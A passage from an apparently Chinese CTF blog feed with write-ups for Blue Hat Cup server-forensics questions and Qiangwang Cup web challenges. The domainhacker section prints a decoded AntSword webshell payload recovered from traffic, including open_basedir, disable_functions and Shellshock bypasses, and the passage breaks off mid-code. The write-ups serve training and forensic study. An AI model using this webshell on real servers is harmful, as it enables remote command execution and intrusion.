src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182234733.png"></p><h3 id="服务器取证-14"><a href="#服务器取证-14" class="headerlink" title="服务器取证_14"></a>服务器取证_14</h3><p><strong>题目：统计涉案网站哪一天登录的会员人数最多。（答案参考格式：1999-09-09）</strong></p><p>使用仿真系统挂载到本地后查看Larvel的默认配置路径,里面有数据库的账号和密码</p><p>cat &#x2F;www&#x2F;wwwroot&#x2F;v9.licai.com&#x2F;.env</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804190232311.png"></p><p>mysql连接后在memberlogs表下可以看到访问的人数和日期时间,修改memberlogs表单updated_at的长度为10方便我们排序</p><p>命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table memberlogs modify column updated_at varchar(10);</span><br></pre></td></tr></table></figure><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804190516374.png"></p><p>根据命令排序后找到访问人数最多的时间为2021-07-14</p><p>命令: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updated_at,count(*) from memberlogs where status=1 group by updated_at order by count(*);</span><br></pre></td></tr></table></figure><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804190609747.png"></p><h3 id="服务器取证-15"><a href="#服务器取证-15" class="headerlink" title="服务器取证_15"></a>服务器取证_15</h3><p>发现<code>mysqldump.sql</code>文件</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184901951.png" alt="image-20220804184901951"></p><p>搜索<code>你好，怎么充值</code>,结合数据表结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `layims` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `fusername` varchar(120) NOT NULL DEFAULT &#x27;&#x27; COMMENT &#x27;发送者用户&#x27;,</span><br><span class="line">  `tousername` varchar(255) DEFAULT NULL COMMENT &#x27;发给用户&#x27;,</span><br><span class="line">  `fromuid` int(11) NOT NULL DEFAULT &#x27;1&#x27; COMMENT &#x27;发送者&#x27;,</span><br><span class="line">  `touid` int(11) NOT NULL DEFAULT &#x27;1&#x27; COMMENT &#x27;发给谁&#x27;,</span><br><span class="line">  `type` varchar(50) DEFAULT NULL COMMENT &#x27;类型&#x27;,</span><br><span class="line">  `content` text NOT NULL COMMENT &#x27;内容&#x27;,</span><br><span class="line">  `status` int(1) DEFAULT &#x27;0&#x27;,</span><br><span class="line">  `created_at` datetime DEFAULT NULL,</span><br><span class="line">  `updated_at` datetime NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=MyISAM AUTO_INCREMENT=7069 DEFAULT CHARSET=utf8 COMMENT=&#x27;在线客服表&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184954018.png" alt="image-20220804184954018"></p><p>得到fusername为hm688</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> 第六届蓝帽杯全国大学生网络安全技能大赛半决赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第六届强网杯全国网络安全挑战赛</title>
      <link href="/2022/07/31/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2022/07/31/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="Bybyweb"><a href="#Bybyweb" class="headerlink" title="Bybyweb"></a>Bybyweb</h3><p>websocket(CSRF) -&gt; Python参数污染&#x2F;go(解析不同)</p><h3 id="rcefile"><a href="#rcefile" class="headerlink" title="rcefile"></a>rcefile</h3><p>文件上传phar</p><p><code>www.zip</code>-&gt; spl_autoload() -&gt; <code>.inc</code>文件 -&gt; 序列化字符串</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> 第六届强网杯全国网络安全挑战赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup</title>
      <link href="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"/>
      <url>/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>第六届”蓝帽杯“全国大学生网络安全技能大赛 Writeups By ACT Team. 2022.7.9</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-domainhacker"><a href="#1-domainhacker" class="headerlink" title="1. domainhacker"></a>1. domainhacker</h3><p>打开数据包，分析http流量，发现大马（shell连接管理工具）</p><p><img src="/2022/07/09/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709195754404.png" alt="image-20220709195754404"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;</span><br><span class="line"><span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/;|:/&quot;</span>,<span class="variable">$opdir</span>);</span><br><span class="line">@<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,<span class="title function_ invoke__">sys_get_temp_dir</span>());</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.c46a89a&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line"><span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line"><span class="variable">$cntarr</span>=@<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;79c2&quot;</span>.<span class="string">&quot;0b92&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;b4e7e&quot;</span>.<span class="string">&quot;465b62&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;yee092cda97a62&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;q8fb9d4c082c11&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$envstr</span>=@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;p48a6d55fac1b1&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">@<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">@<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line"><span class="variable">$envarr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">putenv</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>,@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">array</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>,<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(<span class="title function_ invoke__">function_exists</span>(<span class="variable">$f</span>)&amp;&amp;<span class="title function_ invoke__">is_callable</span>(<span class="variable">$f</span>)&amp;&amp;!<span class="title function_ invoke__">in_array</span>(<span class="variable">$f</span>,<span class="variable">$d</span>));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>) || <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line"><span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">return</span> True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">print</span>(@<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>));</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">join</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$o</span>));</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$fp</span>=@<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line"><span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">2048</span>));</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$p</span> = @<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">1</span>])) &#123;</span><br><span class="line"><span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">2</span>])) &#123;</span><br><span class="line"><span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">@<span class="title function_ invoke__">proc_close</span>(<span class="variable">$p</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">antsystem</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">runshellshock</span>(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @<span class="title function_ invoke__">class_exists</span>(<span class="string">&quot;COM&quot;</span>)) &#123;</span><br><span class="line"><span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line"><span class="variable">$e</span>=<span class="variable">$w</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$so</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line"><span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line"><span class="variable">$se</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdErr</span>();</span><br><span class="line"><span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="variable">$ret</span>=@<span class="title function_ invoke__">runcmd</span>(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span 